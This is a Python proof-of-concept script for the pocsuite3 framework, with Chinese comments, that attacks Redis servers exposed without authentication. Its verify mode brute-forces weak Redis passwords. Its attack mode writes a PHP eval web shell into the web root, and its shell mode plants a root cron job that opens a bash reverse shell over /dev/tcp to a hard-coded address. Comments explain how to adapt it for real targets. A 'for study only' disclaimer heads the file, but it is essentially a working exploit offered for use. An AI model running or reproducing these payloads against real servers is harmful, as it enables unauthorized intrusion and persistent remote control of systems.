#!/usr/bin/python
# -*- coding:utf-8 -*-

"""
    描述：redis未授权访问，使用pocsuite3模块重构
    author：chen
    版本：2.0
    声明：本脚本只做学习使用，请勿用作非法用途！由本脚本产生的恶意行为与本人无关！
"""

# 导入所写PoC所需要类/文件，尽量不要使用第三方模块。
# 迫不得已使用第三方模块有其依赖规则，后面给出。
from pocsuite3.api import Output, POCBase, register_poc
import socket
import urllib
from urllib.parse import urlparse


# PoC实现类，继承POCBase
class DemoPoc(POCBase):
    # PoC信息字段，需要完整填写全部下列信息
    vulID = '89715'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  # 默认为1
    author = 'chen'  # PoC作者的大名
    vulDate = '2015-11-11'  # 漏洞公开的时间,不知道就写今天
    createDate = '2021-07-18'  # 编写PoC的日期
    updateDate = '2021-07-18'  # PoC更新的时间,默认和编写时间一样
    references = ['https://www.seebug.org/vuldb/ssvid-89715']           # 漏洞地址来源,0day不用写
    name = 'redis 未授权访问 PoC'  # PoC名称
    appPowerLink = 'http://redis.io/'  # 漏洞厂商主页地址
    appName = 'Redis'  # 漏洞应用名称
    appVersion = 'all'  # 漏洞影响版本
    vulType = 'Unauthorized access'  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        无需密码直接登录，造成信息泄露、远程控制等
    '''
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = [socket, urllib]  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = ''' 
        pocsuite -u 192.168.21.130 -r .\89715_redis_login_bypass.py --verify
        已完成PoC模式：探测是否存在redis未授权访问以及弱口令  --无限制
        已完成attack模式：网站根目录写一句话木马（这里以个人根目录替代，使用需手动更改） --需要绝对路径、读写权限
        已完成shell模式：写定时任务，centos靶机下可执行，实战需要指定公网ip、端口进行反弹shell    --需要管理员权限
        注：shell模式有系统报错，但是不影响反弹shell写入和反弹连接
    '''

    # 编写验证模式
    def _verify(self):
        result = {}
        # 发送INFO，如果无密码则返回服务器信息，包含版本信息；如果有密码，则返回“-NOAUTH Authentication required”
        payload = 'INFO\r\n'
        dic = ['redis', 'root', 'oracle', 'password', 'p@aaw0rd', 'admin123', 'abc123!', '123456', 'admin']
        # 解析url并获取位置（netloc）内容
        ip = urlparse(self.url).netloc
        port = 6379
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(payload.encode('utf-8'))
        r = s.recv(1024).decode('utf-8')
        if "redis_version" in r:                # 空密码探测
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Target'] = ip + ':' + str(port)
        elif "Authentication" in r:             # 弱口令爆破时
            for i in dic:
                payload = "AUTH " + i + "\r\n"  # AUTH pass 为redis密码格式
                s.send(payload.encode('utf-8'))
                r = s.recv(1024).decode('utf-8')
                if '+OK' in r:
                    result['AdminInfo'] = {}
                    result['AdminInfo']['Password'] = i
        s.close()
        return self.parse_output(result)  # 必须返回result

    # 编写攻击模式
    # 若没有攻击模式，直接写return self._verify()即可
    def _attack(self):
        result = {}
        # payload[0]处自定义网站绝对路径
        # payload[2]处自定义一句话木马
        payload = ['config set dir /var/www/html/\r\n', 'config set dbfilename .redis.php\r\n',
                   'set webshell "<?php @eval=$_REQUEST[1]?>"\r\n',
                   'save\r\n']
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # 实战需改为公网ip、端口
        ip = urlparse(self.url).netloc
        port = 6379
        s.settimeout(1)
        s.connect((ip, port))
        for i in payload:
            s.send(i.encode('utf-8'))
            print(i + '...')
            print(s.recv(1024).decode('utf-8'))
            result['ShellInfo'] = {}
            result['ShellInfo']['URL'] = self.url + '/var/www/html/.redis.php'
        return self.parse_output(result)  # 必须返回result

    def _shell(self):
        # 实战需改payload[2]的反弹ip、端口为公网ip、端口
        payload = ['config set dir /var/spool/cron\r\n', 'config set dbfilename root\r\n',
                   'set xxx "\\n\\n*/1 * * * * /bin/bash -i >& /dev/tcp/192.168.21.112/6666 0>&1\\n\\n"\r\n',
                   'save\r\n']
        # 第一句也可尝试：config set dir /var/spool/cron/crontabs
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ip = urlparse(self.url).netloc
        port = 6379
        s.settimeout(1)
        s.connect((ip, port))
        for i in payload:
            s.send(i.encode('utf-8'))
            print(i + '...')
            print(s.recv(1024).decode('utf-8'))

    # 自定义输出函数，调用框架输出的实例Output
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not Unauthorized access')
        return output


register_poc(DemoPoc)
